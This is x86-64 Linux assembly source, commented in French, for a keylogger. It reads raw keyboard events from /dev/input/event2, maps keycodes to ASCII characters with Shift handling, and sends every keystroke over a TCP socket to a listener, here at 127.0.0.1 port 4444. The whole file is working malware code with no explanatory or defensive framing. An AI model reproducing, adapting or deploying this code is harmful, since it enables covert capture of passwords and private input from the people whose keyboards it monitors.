section .bss
    key_event resb 24   ; Stocker un événement clavier (24 octets)
    socket resq 1
    server resb 16
    fd resq 1            ; File descriptor de /dev/input/eventX
    ascii_key resb 1     ; Stocker la touche ASCII
    shift_flag resb 1    ; Indicateur Shift (1 = actif, 0 = inactif)

section .data
    ip_address db "127.0.0.1", 0
    port dw 4444
    dev_file db "/dev/input/event2", 0  ; MODIFIER AVEC LE BON eventX

section .rodata  ; Tables keycode → ASCII (QWERTY)
lowercase:
    db  0,  0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=',  0,  0
    db  'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']',  10,  0, 'a', 's'
    db  'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', 39, '`',  0, '\\', 'z', 'x', 'c', 'v'
    db  'b', 'n', 'm', ',', '.', '/',  0, '*',  0, ' '  ; ✅ `Space` ajouté ici (57ème entrée)

uppercase:
    db  0,  0, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+',  0,  0
    db  'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}',  10,  0, 'A', 'S'
    db  'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '"', '~',  0, '|', 'Z', 'X', 'C', 'V'
    db  'B', 'N', 'M', '<', '>', '?',  0, '*',  0, ' '  ; ✅ `Space` ajouté ici (57ème entrée)


section .text
    global _start

_start:
    ; 1. Créer un socket
    mov rax, 41      ; syscall socket
    mov rdi, 2       ; AF_INET
    mov rsi, 1       ; SOCK_STREAM
    mov rdx, 0       ; IPPROTO_IP
    syscall
    mov [socket], rax

    ; 2. Configurer l'adresse du serveur
    mov word [server], 2     ; AF_INET
    mov word [server+2], 0x5c11 ; Port 4444
    mov dword [server+4], 0x0100007F ; 127.0.0.1 en hex

    ; 3. Connecter au serveur
    mov rax, 42
    mov rdi, [socket]
    lea rsi, [server]
    mov rdx, 16
    syscall

    ; 4. Ouvrir /dev/input/eventX (mode lecture seule)
    mov rax, 2        ; syscall open
    lea rdi, [dev_file]
    mov rsi, 0        ; O_RDONLY
    syscall
    mov [fd], rax     ; Stocker le file descriptor

read_keys:
    ; 5. Lire une touche depuis /dev/input/eventX
    mov rax, 0       ; syscall read
    mov rdi, [fd]    ; file descriptor du clavier
    mov rsi, key_event
    mov rdx, 24      ; Taille d'un event clavier
    syscall

    ; 6. Vérifier si c'est un KEY_PRESS (EV_KEY)
    cmp word [key_event+16], 1   ; Vérifier type == 1 (EV_KEY)
    jne read_keys                ; Sinon, ignorer

    ; 7. Vérifier si la touche est pressée
    cmp word [key_event+20], 1   ; Vérifier valeur == 1 (Pressé)
    jne check_shift_release       ; Aller vérifier Shift si ce n'est pas une frappe normale

    ; 8. Récupérer le keycode
    movzx rax, word [key_event+18]

    ; 9. Vérifier si c'est Shift
    cmp rax, 42  ; Shift gauche
    je set_shift
    cmp rax, 54  ; Shift droit
    je set_shift

    ; 10. Vérifier si le keycode est dans la table
    cmp rax, 57  ; Si le keycode est > 57, on l'ignore
    jae read_keys

    ; 11. Sélectionner la bonne table en fonction de Shift
    movzx rbx, byte [shift_flag]
    test rbx, rbx
    jnz use_uppercase

use_lowercase:
    lea rbx, lowercase
    jmp get_ascii

use_uppercase:
    lea rbx, uppercase

get_ascii:
    movzx rax, byte [rbx + rax]
    cmp rax, 0
    je read_keys  ; Ignorer si le keycode ne correspond à rien

    ; 12. Stocker le caractère ASCII
    mov [ascii_key], al

send_key:
    ; 13. Envoyer la touche au serveur
    mov rax, 1    ; syscall write
    mov rdi, [socket]  ; socket du serveur
    lea rsi, [ascii_key]  ; Touche convertie
    mov rdx, 1
    syscall

    jmp read_keys  ; Boucle infinie pour capturer les frappes

set_shift:
    mov byte [shift_flag], 1  ; Shift activé
    jmp read_keys

check_shift_release:
    cmp word [key_event+20], 0   ; Vérifier si c'est un relâchement
    jne read_keys

    cmp word [key_event+18], 42  ; Shift gauche relâché ?
    je release_shift
    cmp word [key_event+18], 54  ; Shift droit relâché ?
    je release_shift
    jmp read_keys

release_shift:
    mov byte [shift_flag], 0  ; Shift désactivé
    jmp read_keys
